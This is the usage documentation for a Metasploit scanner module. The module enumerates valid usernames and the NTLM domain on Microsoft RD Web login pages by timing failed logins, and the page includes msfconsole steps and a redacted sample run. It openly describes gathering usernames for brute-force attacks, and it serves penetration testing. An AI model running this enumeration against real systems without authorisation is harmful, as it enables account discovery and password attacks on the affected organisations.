## Vulnerable Application

The Microsoft RD Web login is vulnerable to the same type of authentication username enumeration vulnerability
that is present for OWA. By analyzing the time it takes for a failed response,
the RDWeb interface can be used to quickly test the validity of a set of usernames. Additionally,
this module can attempt to discover the target NTLM domain if you don't already know it.

## Verification Steps


- [ ] Start `msfconsole`
- [ ] `use auxiliary/scanner/http/rdp_web_login`
- [ ] `set rhost TARGET_IP`
- [ ] `set username USER_OR_FILE`
- [ ] `set domain DOMAIN` (Only if you don't want to test the domain discovery feature)
- [ ] Check output for validity of your test username(s)/domain


## Options

### domain

The target domain to use for the username checks. If not provided, enum_domain needs to be set to true so it can be discovered.

### enum_domain

Enumerate the domain by using an NTLM challenge/response and parsing the AD Domain out.

### username

Either a specific username to verify or a file with one username per line to verify.

## Scenarios
If an RDWeb login page is discovered, you can use this module to gather valid usernames for a brute force attack.

Specific target output replaced with Ys so as not to disclose information
```msf6 > use auxiliary/scanner/http/rdp_web_login
msf6 auxiliary(scanner/http/rdp_web_login) > set username /home/kali/users.txt
username => /home/kali/users.txt
msf6 auxiliary(scanner/http/rdp_web_login) > set RHOSTS YY.YYY.YYY.YY
RHOSTS => YY.YYY.YYY.YY
msf6 auxiliary(scanner/http/rdp_web_login) > run

[*] Running for YY.YYY.YYY.YY...
[+] Found Domain: YYYYYYYYYYYY
[-] Username YYYYYYYYYYYY\wrong is invalid! No response received in 1250 milliseconds
[+] Username YYYYYYYYYYYY\YYYYY is valid! Response received in 628.877 milliseconds
[-] Username YYYYYYYYYYYY\k0pak4 is invalid! No response received in 1250 milliseconds
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed```

## Version and OS
Tested against Microsoft IIS 10.0 and RDWeb 2019
